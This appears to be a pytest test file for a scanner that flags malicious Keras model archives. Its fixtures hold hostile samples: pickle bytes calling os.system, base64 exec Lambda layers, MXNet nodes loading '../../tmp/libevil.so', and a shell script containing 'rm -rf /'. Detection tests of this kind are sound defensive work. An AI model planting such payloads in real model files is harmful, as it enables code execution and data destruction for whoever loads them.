        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert cve_issues[0].location is not None
        assert cve_issues[0].location.startswith(f"{keras_path}:")
        assert cve_issues[0].location.rsplit(":", 1)[-1].removeprefix("./") == "model.weights.h5"
        assert cve_issues[0].details["keras_version"] == "3.12.0"
        assert cve_issues[0].details["external_references"] == [
            {
                "kind": "ExternalLink",
                "hdf5_path": "/linked_kernel",
                "filename": "external_source.h5",
                "path": "/payload",
            },
        ]

    def test_scan_accepts_identical_config_json_aliases_without_warning_noise(self, tmp_path: Path) -> None:
        """Byte-identical canonical and normalized config aliases should stay non-noisy."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "identical_config_alias.keras"
        benign_config = {"class_name": "Sequential", "config": {"layers": []}}

        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("./config.json", json.dumps(benign_config))
            zf.writestr("config.json", json.dumps(benign_config))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.13.2"}))

        result = scanner.scan(str(keras_path))

        assert result.success is True
        assert not any(check.name == "Keras ZIP Member Path Validation" for check in result.checks)
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_scan_fails_closed_on_conflicting_exact_and_alias_config_members(self, tmp_path: Path) -> None:
        """A benign canonical config.json must not suppress a malicious normalized alias."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "conflicting_exact_and_alias_config.keras"
        malicious_code = "exec(\"print('Malicious!')\")"
        encoded_code = base64.b64encode(malicious_code.encode()).decode()
        benign_config = {"class_name": "Sequential", "config": {"layers": []}}
        malicious_config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                    }
                ]
            },
        }

        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps(benign_config))
            zf.writestr("./config.json", json.dumps(malicious_config))

        result = scanner.scan(str(keras_path))

        ambiguity_checks = [check for check in result.checks if check.name == "Keras ZIP Member Path Validation"]
        assert len(ambiguity_checks) == 1
        assert ambiguity_checks[0].status == CheckStatus.FAILED
        assert sorted(ambiguity_checks[0].details["candidate_filenames"]) == ["./config.json", "config.json"]
        assert result.success is False

    def test_scan_fails_closed_on_conflicting_exact_duplicate_config_members(self, tmp_path: Path) -> None:
        """A benign trailing duplicate config.json must not hide a malicious earlier duplicate."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "conflicting_duplicate_config.keras"
        malicious_code = "exec(\"print('Malicious!')\")"
        encoded_code = base64.b64encode(malicious_code.encode()).decode()
        malicious_config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                    }
                ]
            },
        }
        benign_config = {"class_name": "Sequential", "config": {"layers": []}}

        with warnings.catch_warnings():
            warnings.simplefilter("ignore", UserWarning)
            with zipfile.ZipFile(keras_path, "w") as zf:
                zf.writestr("config.json", json.dumps(malicious_config))
                zf.writestr("config.json", json.dumps(benign_config))

        result = scanner.scan(str(keras_path))

        ambiguity_checks = [check for check in result.checks if check.name == "Keras ZIP Member Path Validation"]
        assert len(ambiguity_checks) == 1
        assert ambiguity_checks[0].status == CheckStatus.FAILED
        assert ambiguity_checks[0].details["member_name"] == "config.json"
        assert ambiguity_checks[0].details["candidate_filenames"] == ["config.json", "config.json"]
        assert result.success is False

    def test_scan_fails_closed_on_ambiguous_normalized_config_aliases(self, tmp_path: Path) -> None:
        """Multiple non-canonical aliases for config.json should fail closed instead of depending on ZIP order."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "ambiguous_config.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("./config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("/config.json", json.dumps({"class_name": "Functional", "config": {"layers": []}}))

        result = scanner.scan(str(keras_path))

        ambiguity_checks = [check for check in result.checks if check.name == "Keras ZIP Member Path Validation"]
        assert len(ambiguity_checks) == 1
        assert ambiguity_checks[0].status == CheckStatus.FAILED
        assert ambiguity_checks[0].details["member_name"] == "config.json"
        assert sorted(ambiguity_checks[0].details["candidate_filenames"]) == ["./config.json", "/config.json"]
        assert result.success is False

    def test_scan_fails_closed_when_duplicate_config_alias_count_exceeds_cap(self, tmp_path: Path) -> None:
        """Too many duplicate config candidates should fail before decompressing every alias."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "too_many_duplicate_aliases.keras"
        benign_config = json.dumps({"class_name": "Sequential", "config": {"layers": []}})

        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", benign_config)
            for index in range(scanner.MAX_DUPLICATE_MEMBER_COMPARE_CANDIDATES):
                zf.writestr(f"{'./' * (index + 1)}config.json", benign_config)

        with patch.object(
            keras_zip_scanner_module,
            "_read_zip_member_bounded",
            wraps=keras_zip_scanner_module._read_zip_member_bounded,
        ) as mock_read_member:
            result = scanner.scan(str(keras_path))

        ambiguity_checks = [check for check in result.checks if check.name == "Keras ZIP Member Path Validation"]
        assert len(ambiguity_checks) == 1
        assert ambiguity_checks[0].status == CheckStatus.FAILED
        assert len(ambiguity_checks[0].details["candidate_filenames"]) == (
            scanner.MAX_DUPLICATE_MEMBER_COMPARE_CANDIDATES + 1
        )
        assert mock_read_member.call_count == 0
        assert result.success is False

    def test_scan_bounds_recursive_member_rescans_with_embedded_weight_limit(self, tmp_path: Path) -> None:
        """Recursive fallback scans should not extract oversized non-Keras members with unbounded ZIP defaults."""
        scanner = KerasZipScanner({"max_embedded_weights_bytes": 1024})
        keras_path = tmp_path / "oversized_payload.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("payload.pkl", b"0" * 4096)

        result = scanner.scan(str(keras_path))

        recursive_size_checks = [
            check
            for check in result.checks
            if check.name == "ZIP Entry Scan" and check.details.get("entry") == "payload.pkl"
        ]
        assert len(recursive_size_checks) == 1
        assert recursive_size_checks[0].status == CheckStatus.FAILED
        assert "exceeds maximum size of 1024 bytes" in recursive_size_checks[0].message
        assert recursive_size_checks[0].severity == IssueSeverity.INFO
        assert "zip_entry_scan_incomplete" in result.metadata["scan_outcome_reasons"]
        assert result.success is False
        assert result.has_warnings is False

        aggregate_result = scan_model_directory_or_file(str(keras_path), max_embedded_weights_bytes=1024)
        assert determine_exit_code(aggregate_result) == 2

    def test_scan_fails_closed_on_oversized_config_json_and_recurses_payloads(self, tmp_path: Path) -> None:
        """Oversized config.json members should be bounded before parsing and still recurse other entries."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "oversized_config.keras"
        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            config = {
                "class_name": "Sequential",
                "config": {"layers": []},
                "padding": "A" * (11 * 1024 * 1024),
            }
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("payload.pkl", b"cos\nsystem\n(S'echo pwned'\ntR.")

        result = scanner.scan(str(keras_path))

        config_checks = [check for check in result.checks if check.name == "Config JSON Parsing"]
        assert len(config_checks) == 1
        assert config_checks[0].status == CheckStatus.FAILED
        assert "ZIP member exceeds bounded read size" in config_checks[0].message
        assert config_checks[0].details["max_config_bytes"] == 10 * 1024 * 1024
        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "payload.pkl"
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )
        assert result.success is False

    def test_scan_marks_oversized_metadata_json_incomplete_without_false_security_finding(self, tmp_path: Path) -> None:
        """Oversized optional metadata cannot safely exclude hidden nested payloads."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "oversized_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr(
                "metadata.json",
                json.dumps({"keras_version": "3.0.0", "padding": "A" * (11 * 1024 * 1024)}),
            )

        result = scanner.scan(str(keras_path))

        assert result.success is False
        assert result.metadata.get("model_class") == "Sequential"
        assert "keras_version" not in result.metadata
        assert any(
            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
        )
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_scan_validates_symlink_metadata_before_skipping_recursive_content(self, tmp_path: Path) -> None:
        scanner = KerasZipScanner()
        keras_path = tmp_path / "symlink_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            metadata = zipfile.ZipInfo("metadata.json")
            metadata.create_system = 3
            metadata.external_attr = (stat.S_IFLNK | 0o777) << 16
            zf.writestr(metadata, "../external-metadata.json")

        result = scanner.scan(str(keras_path))

        assert any(
            check.name == "Symlink Safety Validation"
            and check.status == CheckStatus.FAILED
            and check.details["entry"] == "metadata.json"
            for check in result.checks
        )

    def test_scan_recurses_pickle_payload_disguised_as_metadata(self, tmp_path: Path) -> None:
        scanner = KerasZipScanner()
        keras_path = tmp_path / "pickle_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", b"cos\nsystem\n(S'echo pwned'\ntR.")

        result = scanner.scan(str(keras_path))

        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "metadata.json"
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )

    def test_scan_recurses_mxnet_symbol_disguised_as_metadata(self, tmp_path: Path) -> None:
        scanner = KerasZipScanner()
        keras_path = tmp_path / "mxnet_metadata.keras"
        symbol_graph = {
            "nodes": [
                {"op": "null", "name": "data", "inputs": []},
                {
                    "op": "Custom",
                    "name": "custom_loader",
                    "attrs": {"library": "../../tmp/libevil.so", "op_type": "unsafe_loader"},
                    "inputs": [[0, 0, 0]],
                },
            ],
            "arg_nodes": [0],
            "heads": [[1, 0, 0]],
        }
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps(symbol_graph))

        result = scanner.scan(str(keras_path))

        assert any(issue.details.get("attribute") == "library" for issue in result.issues)

    def test_scan_fails_closed_for_ambiguous_mxnet_symbol_disguised_as_metadata(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
        keras_path = tmp_path / "ambiguous_mxnet_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr(
                "metadata.json",
                '{"nodes":[{"op":"Custom","name":"load","attrs":"'
                + ("x" * 129)
                + '"},{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
                '"arg_nodes":[0],"heads":[[1,0,0]]}',
            )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert any(
            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
        )

    def test_scan_fails_closed_for_mxnet_node_object_before_metadata_padding(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
        keras_path = tmp_path / "padded_node_mxnet_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr(
                "metadata.json",
                '{"nodes":[{"attrs":"'
                + ("x" * 129)
                + '","op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
                '"arg_nodes":[0],"heads":[[0,0,0]]}',
            )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert any(
            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
        )

    @pytest.mark.parametrize("initial_nodes", ["[]", "null"])
    def test_scan_fails_closed_for_duplicate_mxnet_nodes_after_truncated_metadata_prefix(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        initial_nodes: str,
    ) -> None:
        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
        keras_path = tmp_path / "duplicate_mxnet_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr(
                "metadata.json",
                '{"nodes":'
                + initial_nodes
                + ',"padding":"'
                + ("x" * 129)
                + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
                '"arg_nodes":[0],"heads":[[0,0,0]]}',
            )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert any(
            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
        )

    def test_scan_fails_closed_for_mxnet_nodes_after_visible_head_metadata_padding(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
        keras_path = tmp_path / "padded_mxnet_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr(
                "metadata.json",
                '{"heads":[[0,0,0]],"padding":"'
                + ("x" * 129)
                + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
                '"arg_nodes":[0]}',
            )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert any(
            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
        )

    def test_scan_fails_closed_for_mxnet_nodes_hidden_after_metadata_padding(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
        keras_path = tmp_path / "hidden_mxnet_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr(
                "metadata.json",
                '{"padding":"'
                + ("x" * 129)
                + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
                '"arg_nodes":[0],"heads":[[0,0,0]]}',
            )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert any(
            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
        )

    def test_scan_does_not_suppress_mxnet_ambiguity_in_nested_archive(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
        nested_path = tmp_path / "payload.zip"
        with zipfile.ZipFile(nested_path, "w") as nested_zip:
            nested_zip.writestr(
                "metadata.json",
                '{"heads":[[0,0,0]],"nodes":[{"attrs":"' + ("x" * 129) + '"}],"arg_nodes":[0]}',
            )

        keras_path = tmp_path / "nested_mxnet_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
            zf.write(nested_path, "payload.zip")

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert any(
            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
        )

    def test_oversized_root_weights_skip_does_not_hide_nested_pickle_weights(self, tmp_path: Path) -> None:
        nested_path = tmp_path / "payload.zip"
        with zipfile.ZipFile(nested_path, "w") as nested_zip:
            nested_zip.writestr("model.weights.h5", b'cos\nsystem\n(S"echo pwned"\ntR.')

        keras_path = tmp_path / "nested_weights.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
            zf.writestr("model.weights.h5", b"0" * 4096)
            zf.write(nested_path, "payload.zip")

        result = KerasZipScanner({"max_embedded_weights_bytes": 1024}).scan(str(keras_path))

        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "payload.zip:model.weights.h5"
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )

    def test_lambda_layer_with_exec(self, tmp_path: Path) -> None:
        """Test detection of Lambda layer with exec() call."""
        scanner = KerasZipScanner()

        # Create malicious Lambda layer config
        malicious_code = "exec(\"print('Malicious!')\")"
        encoded_code = base64.b64encode(malicious_code.encode()).decode()

        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {},
                    },
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {
                            "function": [encoded_code, None, None],
                            "function_type": "lambda",
                        },
                    },
                ]
            },
        }

        temp_path = Path(_build_test_keras_zip(config, tmp_path, "3.0.0"))
        result = scanner.scan(str(temp_path))

        # Should detect Lambda layer with exec
        assert len(result.issues) > 0, "Should detect Lambda layer with dangerous code"

        # Check for critical issue
        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
        assert len(critical_issues) > 0, "Lambda with exec should be CRITICAL"

        # Check that exec was detected
        exec_found = False
        for issue in result.issues:
            if "exec" in issue.message.lower() and "lambda" in issue.message.lower():
                exec_found = True
                assert "lambda_1" in issue.message or "lambda_1" in str(issue.details)
                break

        assert exec_found, "Should detect exec in Lambda layer"

    def test_multiple_dangerous_patterns(self, tmp_path: Path) -> None:
        """Test detection of multiple dangerous patterns in Lambda layers."""
        scanner = KerasZipScanner()

        # Create Lambda with multiple dangerous patterns
        dangerous_code = """
import os
import subprocess
eval("os.system('cmd')")
subprocess.call(['ls'])
__import__('pickle').loads(data)
"""
        encoded_code = base64.b64encode(dangerous_code.encode()).decode()

        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "dangerous_lambda",
                        "config": {
                            "function": [encoded_code, None, None],
                        },
                    }
                ]
            },
        }

        temp_path = tmp_path / "multiple_patterns.keras"
        with zipfile.ZipFile(temp_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))

        result = scanner.scan(str(temp_path))

        # Should detect dangerous patterns
        assert len(result.issues) > 0, "Should detect dangerous patterns"

        # Check that multiple patterns were detected
        all_messages = " ".join(issue.message for issue in result.issues)
        patterns_detected = []
        for pattern in ["eval", "subprocess", "__import__", "pickle"]:
            if pattern in all_messages.lower():
                patterns_detected.append(pattern)

        assert len(patterns_detected) > 0, f"Should detect dangerous patterns, found: {patterns_detected}"

    def test_safe_lambda_layer(self, tmp_path: Path) -> None:
        """Test that safe Lambda layers are handled appropriately."""
        scanner = KerasZipScanner()

        # Create a Lambda with safe code
        safe_code = "lambda x: x * 2"
        encoded_code = base64.b64encode(safe_code.encode()).decode()

        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "safe_lambda",
                        "config": {
                            "function": [encoded_code, None, None],
                        },
                    }
                ]
            },
        }

        temp_path = tmp_path / "safe_lambda.keras"
        with zipfile.ZipFile(temp_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))

        result = scanner.scan(str(temp_path))

        # Safe Lambda should not be CRITICAL
        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
        assert len(critical_issues) == 0, "Safe Lambda should not be CRITICAL"

    def test_opaque_lambda_bytecode_stays_warning(self, tmp_path: Path) -> None:
        """Opaque compiled Lambda bytecode should remain a warning-level finding."""
        scanner = KerasZipScanner()
        encoded_code = base64.b64encode(marshal.dumps((lambda x: x + 1).__code__)).decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "opaque_lambda",
                        "config": {"function": [encoded_code, None, None]},
                    }
                ]
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config)))

        opaque_issues = [
            issue
            for issue in result.issues
            if "opaque encoded bytecode" in issue.message and "opaque_lambda" in issue.message
        ]
        assert len(opaque_issues) == 1
        assert opaque_issues[0].severity == IssueSeverity.WARNING
        assert not [
            issue
            for issue in result.issues
            if "opaque_lambda" in issue.message and issue.severity == IssueSeverity.CRITICAL
        ]

    def test_stringlookup_external_vocabulary_path_triggers_cve_2025_12058(self, tmp_path: Path) -> None:
        """Absolute StringLookup vocabulary paths should be attributed to CVE-2025-12058 on vulnerable Keras."""
        scanner = KerasZipScanner()
        external_vocab_path = tmp_path / "leaked-vocab.txt"
        external_vocab_path.write_text("secret-token\n", encoding="utf-8")

        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": str(external_vocab_path)},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
        assert len(cve_checks) == 1
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].severity == IssueSeverity.WARNING
        assert cve_checks[0].details["layer_name"] == "string_lookup"
        assert cve_checks[0].details["cwe"] == "CWE-502, CWE-918"

    def test_stringlookup_remote_vocabulary_url_triggers_cve_2025_12058(self, tmp_path: Path) -> None:
        """Remote StringLookup vocabulary URLs should also be attributed to CVE-2025-12058."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": "https://example.com/vocab.txt"},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
        assert len(cve_checks) == 1
        assert cve_checks[0].details["vocabulary"] == "https://example.com/vocab.txt"

    def test_stringlookup_vocabulary_evidence_redacts_signed_urls(self, tmp_path: Path) -> None:
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {
                            "vocabulary": (
                                "https://example.com/vocab.txt?X-Amz-Signature=SIGNED123&token=VOCABSECRET456&ok=1"
                            )
                        },
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        serialized = result.to_json()
        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
        assert len(cve_checks) == 1
        vocabulary = cve_checks[0].details["vocabulary"]
        assert "SIGNED123" not in serialized
        assert "VOCABSECRET456" not in serialized
        assert "ok=1" in vocabulary
        assert "X-Amz-Signature=<redacted>" in vocabulary
        assert "token=<redacted>" in vocabulary

    def test_stringlookup_inline_vocabulary_list_stays_clean(self, tmp_path: Path) -> None:
        """Inline StringLookup vocabularies are benign and should not emit warnings."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": ["red", "green", "blue"]},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        assert all(check.details.get("cve_id") != "CVE-2025-12058" for check in result.checks)
        noisy_issues = [
            issue for issue in result.issues if issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL)
        ]
        assert noisy_issues == []

    def test_stringlookup_external_vocabulary_path_is_passing_on_fixed_keras(self, tmp_path: Path) -> None:
        """Fixed-version metadata from the archive is inconclusive, but should not emit warning noise."""
        scanner = KerasZipScanner()
        external_vocab_path = tmp_path / "vocab.txt"
        external_vocab_path.write_text("token\n", encoding="utf-8")
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": str(external_vocab_path)},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.12.0")
        result = scanner.scan(str(model_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
        assert len(cve_checks) == 1
        assert cve_checks[0].name == "StringLookup External Vocabulary Metadata Check"
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].severity == IssueSeverity.INFO
        assert "metadata-only assessment is inconclusive" in cve_checks[0].message
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_stringlookup_windows_home_relative_path_is_detected(self, tmp_path: Path) -> None:
        """Windows-style home-relative vocabulary paths should be normalized and detected."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": "~\\vocab.txt"},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        assert any(
            check.details.get("cve_id") == "CVE-2025-12058" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_stringlookup_prerelease_versions_treated_as_vulnerable(self, tmp_path: Path) -> None:
        """Prereleases of the fixed Keras version are still vulnerable."""
        scanner = KerasZipScanner()
        external_vocab_path = tmp_path / "vocab.txt"
        external_vocab_path.write_text("token\n", encoding="utf-8")
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": str(external_vocab_path)},
                    },
                ],
            },
        }

        for keras_version in ("3.12.0a0", "3.12.0rc1", "3.12.0.dev0"):
            model_path = create_configured_keras_zip(tmp_path, config, keras_version=keras_version)
            result = scanner.scan(str(model_path))

            cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
            assert len(cve_checks) == 1
            assert cve_checks[0].status == CheckStatus.FAILED
            assert cve_checks[0].severity == IssueSeverity.WARNING

    def test_custom_registered_objects(self, tmp_path: Path) -> None:
        """Test detection of custom registered objects."""
        scanner = KerasZipScanner()

        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "registered_name": "custom_package.CustomDense",
                        "config": {},
                    }
                ]
            },
        }

        temp_path = tmp_path / "custom_registered.keras"
        with zipfile.ZipFile(temp_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))

        result = scanner.scan(str(temp_path))

        # Should detect custom registered object
        custom_found = False
        for check in result.checks:
            if "custom" in check.message.lower() and "registered" in check.message.lower():
                custom_found = True
                break

        assert custom_found, "Should detect custom registered objects"

    def test_executable_files_in_zip(self, tmp_path: Path) -> None:
        """Test detection of executable files in the ZIP archive."""
        scanner = KerasZipScanner()

        config = {"class_name": "Sequential", "config": {"layers": []}}

        temp_path = tmp_path / "executable_files.keras"
        with zipfile.ZipFile(temp_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            # Add suspicious files
            zf.writestr("malicious.py", "import os; os.system('cmd')")
            zf.writestr("script.sh", "#!/bin/bash\nrm -rf /")

        result = scanner.scan(str(temp_path))

        # Should detect Python and shell scripts
        suspicious_files = []
        for check in result.checks:
            if "Python file" in check.message or "Executable file" in check.message:
                suspicious_files.append(check.message)

        assert len(suspicious_files) >= 2, f"Should detect suspicious files, found: {suspicious_files}"

    def test_case_insensitive_suspicious_extension_detection(self, tmp_path: Path) -> None:
        """Uppercase/mixed-case executable extensions should be detected."""
        scanner = KerasZipScanner()

        config = {"class_name": "Sequential", "config": {"layers": []}}
        archive_path = tmp_path / "suspicious_extensions.keras"

        with zipfile.ZipFile(archive_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("MALWARE.PY", "print('evil')")
            zf.writestr("run.SH", "#!/bin/bash\necho evil")
            zf.writestr("plugin.SO", b"\x7fELF")
            zf.writestr("libpayload.SO.6", b"\x7fELF")
            zf.writestr("plugin.Dylib", b"\xfe\xed\xfa\xcf")
            zf.writestr("launcher.BASH", "#!/usr/bin/env bash\necho evil")
            zf.writestr("runner.Cmd", "@echo off")
            zf.writestr("screensaver.SCR", b"MZ")
            zf.writestr("payload.COM", b"MZ")
            zf.writestr("dropper.PS1", "Start-Process calc.exe")

        result = scanner.scan(str(archive_path))
        suspicious_filenames = {
            check.details.get("filename")
            for check in result.checks
            if "Python file found in Keras ZIP" in check.message
            or "Executable file found in Keras ZIP" in check.message
        }
        assert {
            "MALWARE.PY",
            "run.SH",
            "plugin.SO",
            "libpayload.SO.6",
            "plugin.Dylib",
            "launcher.BASH",
            "runner.Cmd",
            "screensaver.SCR",
            "payload.COM",
            "dropper.PS1",
        }.issubset(suspicious_filenames)

    def test_executable_extension_near_matches_stay_clean(self, tmp_path: Path) -> None:
        """Executable extension near matches should not be treated as executable archive members."""
        archive_path = tmp_path / "safe.keras"
